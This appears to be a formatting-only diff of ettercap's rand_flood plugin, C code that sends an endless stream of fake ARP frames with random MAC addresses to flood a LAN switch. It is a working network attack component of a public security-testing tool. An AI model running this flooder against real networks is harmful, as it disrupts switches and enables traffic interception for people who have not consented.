@@ -1,24 +1,23 @@
 /*
-    rand_flood -- ettercap plugin -- Flood the LAN with random MAC addresses
-
-    Copyright (C) ALoR & NaGA
-    
-    This program is free software; you can redistribute it and/or modify
-    it under the terms of the GNU General Public License as published by
-    the Free Software Foundation; either version 2 of the License, or
-    (at your option) any later version.
-
-    This program is distributed in the hope that it will be useful,
-    but WITHOUT ANY WARRANTY; without even the implied warranty of
-    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-    GNU General Public License for more details.
-
-    You should have received a copy of the GNU General Public License
-    along with this program; if not, write to the Free Software
-    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
-
-*/
-
+ *  rand_flood -- ettercap plugin -- Flood the LAN with random MAC addresses
+ *
+ *  Copyright (C) ALoR & NaGA
+ *
+ *  This program is free software; you can redistribute it and/or modify
+ *  it under the terms of the GNU General Public License as published by
+ *  the Free Software Foundation; either version 2 of the License, or
+ *  (at your option) any later version.
+ *
+ *  This program is distributed in the hope that it will be useful,
+ *  but WITHOUT ANY WARRANTY; without even the implied warranty of
+ *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ *  GNU General Public License for more details.
+ *
+ *  You should have received a copy of the GNU General Public License
+ *  along with this program; if not, write to the Free Software
+ *  Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
+ *
+ */
 
 #include <ec.h>                        /* required for global variables */
 #include <ec_plugins.h>                /* required for plugin ops */
@@ -29,33 +28,31 @@
 #include <ec_sleep.h>
 
 /* globals */
-struct eth_header
-{
-   u_int8   dha[ETH_ADDR_LEN];       /* destination eth addr */
-   u_int8   sha[ETH_ADDR_LEN];       /* source ether addr */
-   u_int16  proto;                   /* packet type ID field */
+struct eth_header {
+   u_int8 dha[ETH_ADDR_LEN];         /* destination eth addr */
+   u_int8 sha[ETH_ADDR_LEN];         /* source ether addr */
+   u_int16 proto;                    /* packet type ID field */
 };
 
 struct arp_header {
-   u_int16  ar_hrd;          /* Format of hardware address.  */
-   u_int16  ar_pro;          /* Format of protocol address.  */
-   u_int8   ar_hln;          /* Length of hardware address.  */
-   u_int8   ar_pln;          /* Length of protocol address.  */
-   u_int16  ar_op;           /* ARP opcode (command).  */
+   u_int16 ar_hrd;           /* Format of hardware address.  */
+   u_int16 ar_pro;           /* Format of protocol address.  */
+   u_int8 ar_hln;            /* Length of hardware address.  */
+   u_int8 ar_pln;            /* Length of protocol address.  */
+   u_int16 ar_op;            /* ARP opcode (command).  */
 #define ARPOP_REQUEST   1    /* ARP request.  */
 };
 
 struct arp_eth_header {
-   u_int8   arp_sha[MEDIA_ADDR_LEN];     /* sender hardware address */
-   u_int8   arp_spa[IP_ADDR_LEN];      /* sender protocol address */
-   u_int8   arp_tha[MEDIA_ADDR_LEN];     /* target hardware address */
-   u_int8   arp_tpa[IP_ADDR_LEN];      /* target protocol address */
+   u_int8 arp_sha[MEDIA_ADDR_LEN];       /* sender hardware address */
+   u_int8 arp_spa[IP_ADDR_LEN];        /* sender protocol address */
+   u_int8 arp_tha[MEDIA_ADDR_LEN];       /* target hardware address */
+   u_int8 arp_tpa[IP_ADDR_LEN];        /* target protocol address */
 };
 
-#define FAKE_PCK_LEN sizeof(struct eth_header)+sizeof(struct arp_header)+sizeof(struct arp_eth_header)
+#define FAKE_PCK_LEN sizeof(struct eth_header) + sizeof(struct arp_header) + sizeof(struct arp_eth_header)
 struct packet_object fake_po;
 char fake_pck[FAKE_PCK_LEN];
-
 
 /* protos */
 int plugin_load(void *);
@@ -63,60 +60,58 @@ static int rand_flood_init(void *);
 static int rand_flood_fini(void *);
 EC_THREAD_FUNC(flooder);
 
-
 /* plugin operations */
 
-struct plugin_ops rand_flood_ops = { 
+struct plugin_ops rand_flood_ops = {
    /* ettercap version MUST be the global EC_VERSION */
-   .ettercap_version =  EC_VERSION,                        
+   .ettercap_version = EC_VERSION,
    /* the name of the plugin */
-   .name =              "rand_flood",  
-    /* a short description of the plugin (max 50 chars) */                    
-   .info =              "Flood the LAN with random MAC addresses",  
-   /* the plugin version. */ 
-   .version =           "1.0",   
+   .name = "rand_flood",
+   /* a short description of the plugin (max 50 chars) */
+   .info = "Flood the LAN with random MAC addresses",
+   /* the plugin version. */
+   .version = "1.0",
    /* activation function */
-   .init =              &rand_flood_init,
-   /* deactivation function */                     
-   .fini =              &rand_flood_fini,
+   .init = &rand_flood_init,
+   /* deactivation function */
+   .fini = &rand_flood_fini,
 };
 
 /**********************************************************/
 
 /* this function is called on plugin load */
-int plugin_load(void *handle) 
+int plugin_load(void *handle)
 {
    return plugin_register(handle, &rand_flood_ops);
 }
 
 /******************* STANDARD FUNCTIONS *******************/
 
-static int rand_flood_init(void *dummy) 
-{     
+static int rand_flood_init(void *dummy)
+{
    /* variable not used */
-   (void) dummy;
+   (void)dummy;
 
    /* It doesn't work if unoffensive */
    if (GBL_OPTIONS->unoffensive) {
       INSTANT_USER_MSG("rand_flood: plugin doesn't work in UNOFFENSIVE mode\n");
       return PLUGIN_FINISHED;
    }
-      
+
    INSTANT_USER_MSG("rand_flood: Start flooding the LAN...\n");
 
    /* create the flooding thread */
    ec_thread_new("flooder", "Random flooder thread", &flooder, NULL);
-        
+
    return PLUGIN_RUNNING;
 }
 
-
-static int rand_flood_fini(void *dummy) 
+static int rand_flood_fini(void *dummy)
 {
    pthread_t pid;
 
    /* variable not used */
-   (void) dummy;
+   (void)dummy;
 
    pid = ec_thread_getpid("flooder");
 
@@ -129,7 +124,6 @@ static int rand_flood_fini(void *dummy)
    return PLUGIN_FINISHED;
 }
 
-
 EC_THREAD_FUNC(flooder)
 {
    struct timeval seed;
@@ -139,9 +133,9 @@ EC_THREAD_FUNC(flooder)
    u_char MACS[ETH_ADDR_LEN], MACD[ETH_ADDR_LEN];
 
    /* variable not used */
-   (void) EC_THREAD_PARAM;
+   (void)EC_THREAD_PARAM;
 
-   /* Get a "random" seed */ 
+   /* Get a "random" seed */
    gettimeofday(&seed, NULL);
    srandom(seed.tv_sec ^ seed.tv_usec);
 
@@ -154,13 +148,13 @@ EC_THREAD_FUNC(flooder)
    harp->ar_pro = htons(ETHERTYPE_IP);
    harp->ar_hln = 6;
    harp->ar_pln = 4;
-   harp->ar_op  = htons(ARPOP_REQUEST);
+   harp->ar_op = htons(ARPOP_REQUEST);
 
-   packet_create_object(&fake_po, (u_char*)fake_pck, FAKE_PCK_LEN);
+   packet_create_object(&fake_po, (u_char *)fake_pck, FAKE_PCK_LEN);
 
    /* init the thread and wait for start up */
    ec_thread_init();
-   
+
    LOOP {
       CANCELLATION_POINT();
 
@@ -175,21 +169,20 @@ EC_THREAD_FUNC(flooder)
       memcpy(MACD + 4, &rnd, 2);
 
       /* Fill the source and destination MAC address
-       * with random values 
+       * with random values
        */
       memcpy(heth->dha, MACD, ETH_ADDR_LEN);
       memcpy(heth->sha, MACS, ETH_ADDR_LEN);
 
       /* Send on the wire and wait */
-      send_to_L2(&fake_po); 
+      send_to_L2(&fake_po);
 
       ec_usleep(GBL_CONF->port_steal_send_delay);
    }
-   
-   return NULL; 
+
+   return NULL;
 }
 
 /* EOF */
 
 // vim:ts=3:expandtab
- 
